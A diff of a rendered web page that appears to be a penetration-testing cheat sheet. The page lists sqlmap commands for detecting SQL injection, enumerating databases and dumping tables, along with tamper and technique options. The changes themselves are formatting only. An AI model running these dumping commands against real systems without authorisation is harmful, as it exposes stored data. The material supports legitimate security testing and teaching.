@@ -53,7 +53,7 @@
 </span></span><span class="line"><span class="cl">sqlmap -r request --batch --banner --proxy<span class="o">=</span>http://127.0.0.1:8080 --level <span class="m">3</span> --risk <span class="m">3</span> --threads<span class="o">=</span><span class="m">10</span>
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Initial testing HTTPS</span>
 </span></span><span class="line"><span class="cl">sqlmap -r request --batch --banner --proxy<span class="o">=</span>http://127.0.0.1:8080 --level <span class="m">3</span> --risk <span class="m">3</span> --threads<span class="o">=</span><span class="m">10</span> --force-ssl
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Add a string to indicate injection succeed (e.g., Invalid User vs Error Occurred)</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Add a string to indicate injection succeed (e.g. Invalid User vs Error Occurred)</span>
 </span></span><span class="line"><span class="cl">sqlmap -r request --batch --banner --proxy<span class="o">=</span>http://127.0.0.1:8080 --level <span class="m">3</span> --risk <span class="m">3</span> --threads<span class="o">=</span><span class="m">10</span> --string <span class="s1">&#39;Invalid User&#39;</span>
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Get databases</span>
 </span></span><span class="line"><span class="cl">sqlmap -r request --batch --banner --proxy<span class="o">=</span>http://127.0.0.1:8080 --level <span class="m">3</span> --risk <span class="m">3</span> --threads<span class="o">=</span><span class="m">10</span> --dbs
@@ -63,20 +63,22 @@
 </span></span><span class="line"><span class="cl">sqlmap -r request --batch --banner --proxy<span class="o">=</span>http://127.0.0.1:8080 --level <span class="m">3</span> --risk <span class="m">3</span> --threads<span class="o">=</span><span class="m">10</span> -D DB_NAME -T TABLE_NAME --dump
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Dump all tables (slow)</span>
 </span></span><span class="line"><span class="cl">sqlmap -r request --batch --banner --proxy<span class="o">=</span>http://127.0.0.1:8080 --level <span class="m">3</span> --risk <span class="m">3</span> --threads<span class="o">=</span><span class="m">10</span> -D DB_NAME --dump
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Add payload tamper script, e.g., randomcase</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Add payload tamper script, e.g. randomcase</span>
 </span></span><span class="line"><span class="cl">sqlmap -r request --batch --banner --proxy<span class="o">=</span>http://127.0.0.1:8080 --level <span class="m">3</span> --risk <span class="m">3</span> --threads<span class="o">=</span><span class="m">10</span> --tamper randomcase
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Specify technique</span>
 </span></span><span class="line"><span class="cl">sqlmap -r request --batch --banner --proxy<span class="o">=</span>http://127.0.0.1:8080 --level <span class="m">3</span> --risk <span class="m">3</span> --threads<span class="o">=</span><span class="m">10</span> --technique U
 </span></span></code></pre></div><h4 id="technique">Technique</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">B: Boolean-based blind
-</span></span><span class="line"><span class="cl">E: Error-based
-</span></span><span class="line"><span class="cl">U: Union query-based
-</span></span><span class="line"><span class="cl">S: Stacked queries
-</span></span><span class="line"><span class="cl">T: Time-based blind
-</span></span><span class="line"><span class="cl">Q: Inline queries
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">+----------------------+
+</span></span><span class="line"><span class="cl">|B: Boolean-based blind|
+</span></span><span class="line"><span class="cl">|E: Error-based        |
+</span></span><span class="line"><span class="cl">|U: Union query-based  |
+</span></span><span class="line"><span class="cl">|S: Stacked queries    |
+</span></span><span class="line"><span class="cl">|T: Time-based blind   |
+</span></span><span class="line"><span class="cl">|Q: Inline queries     |
+</span></span><span class="line"><span class="cl">+----------------------+
 </span></span></code></pre></div><br></div></div>
     
-    <script src="/utils.js"></script>
+    <script src="/js/utils.js"></script>
     <footer>
     <hr>
     <div class="footer-text">
